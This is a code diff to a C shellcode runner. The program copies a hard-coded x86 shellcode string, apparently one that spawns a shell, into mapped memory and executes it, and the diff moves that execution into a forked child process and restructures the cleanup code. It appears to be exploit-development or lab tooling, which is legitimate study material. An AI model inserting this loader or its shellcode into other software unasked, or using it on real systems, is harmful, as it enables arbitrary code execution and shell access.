@@ -6,7 +6,9 @@
 #endif
 
 #include <sys/mman.h>
+#include <sys/types.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 /*
@@ -46,6 +48,8 @@ int main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
+  int ret, wstatus;
+  pid_t pid;
   struct utsname uts;
   char *pcall;
   char *shellcode = "\x33\xf6\x56\x68\x6e\x2f\x73\x68"
@@ -58,15 +62,15 @@ int main(int argc, char **argv) {
 
   if (pcall == MAP_FAILED) {
     perror("mmap()");
-    return -1;
+    ret = -1;
+    goto __fallback;
   }
 
   bzero(&uts, sizeof(struct utsname));
 
-  if (uname(&uts) < 0) {
+  if ((ret = uname(&uts)) < 0) {
     perror("uname()");
-    munmap(pcall, sysconf(_SC_PAGESIZE));
-    return -1;
+    goto __must_unmap;
   }
 
   printf("[*] Machine info\n");
@@ -79,11 +83,29 @@ int main(int argc, char **argv) {
   printf("[*] Copying shellcode into crafted buffer.\n");
   memcpy(pcall, shellcode, strlen(shellcode));
 
-  printf("[*] Executing the shellcode..\n");
-  __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  pid = fork();
+
+  if (pid < 0) {
+    perror("fork()");
+    ret = pid;
+    goto __must_unmap;
+  }
+
+  if (!pid) {
+    printf("[*] Executing the shellcode..\n");
+    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  } else {
+    waitpid(-1, &wstatus, 0);
+  }
 
   printf("[*] Cleaning up..\n");
   munmap(pcall, sysconf(_SC_PAGESIZE));
 
   return 0;
+
+__must_unmap:
+  munmap(pcall, sysconf(_SC_PAGESIZE));
+
+__fallback:
+  return ret;
 }
